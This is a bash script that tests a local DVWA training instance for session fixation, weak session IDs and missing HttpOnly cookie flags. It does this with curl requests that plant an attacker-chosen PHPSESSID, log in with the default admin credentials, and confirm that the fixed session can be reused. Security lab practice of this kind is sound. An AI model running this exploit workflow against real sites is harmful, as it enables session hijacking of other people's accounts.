#!/bin/bash
TARGET="http://127.0.0.1:8080"

echo "=== Session Fixation - Clean Test ==="
echo ""
echo "1. Attacker chooses a session ID: attacker_session_123"
echo ""

# Step 1: Use the injected session to get a CSRF token from login
echo "2. Using injected session to get login page..."
login_resp=$(curl -s -D /tmp/fix_headers.txt \
    -H "Cookie: PHPSESSID=attacker_session_123; security=low" \
    "$TARGET/login.php")
echo "Set-Cookie headers from response:"
grep -i "^Set-Cookie" /tmp/fix_headers.txt || echo "(none - server accepted our session)"
echo ""

token=$(echo "$login_resp" | grep -oP "value='\K[a-f0-9]+" | head -1)
echo "CSRF Token: $token"

# Step 2: Login with injected session
echo ""
echo "3. Victim logs in with the injected session..."
login_result=$(curl -s -L -D /tmp/fix_headers2.txt \
    -H "Cookie: PHPSESSID=attacker_session_123; security=low" \
    -d "username=admin&password=password&user_token=${token}&Login=Login" \
    "$TARGET/login.php")

echo "Set-Cookie headers after login:"
grep -i "^Set-Cookie" /tmp/fix_headers2.txt || echo "(none)"
echo ""

# Check if login was successful
if echo "$login_result" | grep -q "Welcome"; then
    echo "[!] Login successful with injected session!"
    echo ""
    echo "4. Attacker now uses the same session ID to access the app..."
    attacker_access=$(curl -s -H "Cookie: PHPSESSID=attacker_session_123; security=low" \
        "$TARGET/index.php")
    if echo "$attacker_access" | grep -q "Welcome\|logout\|Menu"; then
        echo "[!] ATTACKER CAN ACCESS THE APP WITH SAME SESSION ID!"
        echo "[!] SESSION FIXATION VULNERABILITY CONFIRMED!"
        echo "$attacker_access" | grep -i "<title>" | head -2
    else
        echo "[-] Attacker cannot access"
        echo "$attacker_access" | grep -i "<title>" | head -2
    fi
else
    echo "[-] Login failed"
fi
echo ""

echo "=== Weak Session ID - Generate and check ==="
echo ""
# Login properly first
rm -f /tmp/wid_cookies2.txt
resp=$(curl -s -c /tmp/wid_cookies2.txt "$TARGET/login.php")
token2=$(echo "$resp" | grep -oP "value='\K[a-f0-9]+" | head -1)
login_resp2=$(curl -s -L -b /tmp/wid_cookies2.txt -c /tmp/wid_cookies3.txt \
    -d "username=admin&password=password&user_token=${token2}&Login=Login" \
    "$TARGET/login.php")

# Now generate weak session IDs
echo "Generating dvwaSession cookies..."
for i in 1 2 3 4 5; do
    gen_resp=$(curl -s -D - -b /tmp/wid_cookies3.txt -o /dev/null \
        -d "Generate=Generate" \
        "$TARGET/vulnerabilities/weak_id/" 2>&1 | grep -i "^Set-Cookie.*dvwaSession")
    echo "Attempt $i: $gen_resp"
    sleep 0.3
done

echo ""
echo "=== Check dvwaSession cookie value ==="
curl -s -b /tmp/wid_cookies3.txt -c /tmp/wid_cookies4.txt \
    -d "Generate=Generate" \
    "$TARGET/vulnerabilities/weak_id/" > /dev/null
echo "Cookie jar:"
cat /tmp/wid_cookies4.txt | grep dvwaSession
echo ""

echo "=== Test session without HttpOnly by checking if JS can access it ==="
echo "Note: PHPSESSID Set-Cookie header:"
curl -s -D - -o /dev/null "$TARGET/login.php" 2>&1 | grep -i "^Set-Cookie"

